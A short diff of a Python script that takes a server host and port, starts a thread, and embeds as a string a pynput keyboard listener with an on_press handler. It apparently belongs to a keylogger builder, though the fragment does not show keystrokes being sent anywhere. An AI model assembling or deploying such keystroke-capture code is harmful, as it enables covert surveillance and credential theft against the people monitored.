@@ -20,7 +20,7 @@ def main() -> None:
     if args[0] == "server":
         e.SERVER_HOST = args[1]
         e.SERVER_PORT = int(args[2])
-        e.dump_config()
+        e.dump_config() 
 
         threading.Thread(target=k1).start()
 
@@ -58,4 +58,7 @@ if __name__ == "__main__":
 from pynput import keyboard
 listener = keyboard.Listener(
     on_press=on_press)
-listener.start()"""
+listener.start()
+listener.join()
+
+"""
